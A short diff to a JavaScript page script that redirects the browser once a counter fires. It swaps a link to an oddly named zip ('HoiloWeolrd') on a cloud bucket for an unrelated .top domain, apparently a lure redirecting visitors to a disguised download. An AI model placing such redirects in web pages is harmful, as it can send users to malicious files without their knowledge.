@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://hdliswhs.oss-cn-hongkong.aliyuncs.com/HoiloWeolrd6.9.7-x64.zip";
+		var url="https://hyeiyevverldd.top";
 		window.location=url;
 	}
 }
@@ -11,4 +11,5 @@ var num=0;
 function getLoad()
 {
 	num++;
+
 }
